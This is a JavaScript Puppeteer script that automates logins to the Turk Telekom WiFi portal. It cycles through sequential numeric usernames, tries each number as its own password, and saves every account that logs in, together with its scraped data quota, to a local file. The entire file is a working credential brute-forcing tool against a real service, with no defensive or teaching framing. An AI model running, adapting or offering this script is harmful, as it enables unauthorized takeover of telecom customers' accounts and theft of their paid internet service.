const puppeteer = require("puppeteer");
const fs = require("fs");
// Developer Notes
	//Known Bugs:
		// skips first two numbers
		// skips every first number after successfull login

var user = 2110000;
var howManyTrys = 1000;

var accountFound = false;
const url = "https://giris.turktelekomwifi.com/#/";

const TTMusteri_Button = "#accordingMenuButton";
const Internet_Button = "#according-menu > button:nth-child(1)";
const InternetGiris_Button = "#adslBtn";

const checkBoxID = 'input[name="termsCheckBox"]';
const userName_InputField = "#adslUsername";
const password_InputField = 'input[name="password"]';
const login_Button = "#loginBtn:not([disabled])";

const exitButton = "a[data-autamation=\"cikis\"]";
const tableContent = "td.alert-link";

async function findInternet(){

	const page = await startBrowser();

	while (howManyTrys !== 0) {

		await navigateSite(page);
        await fillForm(page);	
        await exitAccount(page);
        await showQuota(page);
	}
	
	console.log("Proccess complete\nExiting")
	await browser.close();
}

async function startBrowser(){

	const browser = await puppeteer.launch({
		headless: true,
		defaultViewport: null
	});

	const _page = await browser.newPage();

	await _page.goto(url,{
		waitUntil: "domcontentloaded"
	});
	return _page;
}

async function navigateSite(page){
	await page.waitForSelector(TTMusteri_Button);
	await page.click(TTMusteri_Button);

	await page.waitForSelector(Internet_Button);
	await page.click(Internet_Button);

	await page.waitForSelector(InternetGiris_Button);
	await Promise.all([
		page.waitForNavigation(),
		await page.click(InternetGiris_Button)
	])
}

async function fillForm(page){


	await page.waitForSelector(checkBoxID);
	const checkbox = await page.$(checkBoxID);
	var checked = await (await checkbox.getProperty('checked')).jsonValue();

	if (!checked){
		await page.click(checkBoxID);
	}
	
	while (!accountFound && (howManyTrys !== 0)) {

		howManyTrys -= 1;
		user += 1;
        console.log(user);	

	    // clear input field
		async function clear(page, selector) {
			await page.evaluate(selector => {
			document.querySelector(selector).value = "";
			}, selector);
		}

		await page.waitForSelector(userName_InputField);
		await page.waitForSelector(password_InputField);

		await clear(page, userName_InputField);
		await clear(page, password_InputField);

		await page.type(userName_InputField, user.toString());
		await page.type(password_InputField, user.toString());		

        try {
            await page.waitForSelector(login_Button,{timeout:15000});
            await page.click(login_Button);
        } catch (error) {
			console.log("account found!");
            fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${user}`, err => {})
            accountFound = true;
        }
	}
}

async function exitAccount(page){

	try {
		await page.waitForSelector(exitButton,{timeout:5000});
		page.click(exitButton);
	} catch (error) {
	}

	accountFound = false;
}

async function showQuota(page) {

	await page.waitForSelector(tableContent);
    var table = await page.evaluate(async() => {
        let tds = Array.from(document.querySelectorAll("td.alert-link"))
        return tds.map(td => td.innerText)
    });
    console.log(table);
    fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${table}`, err => {})
}

findInternet();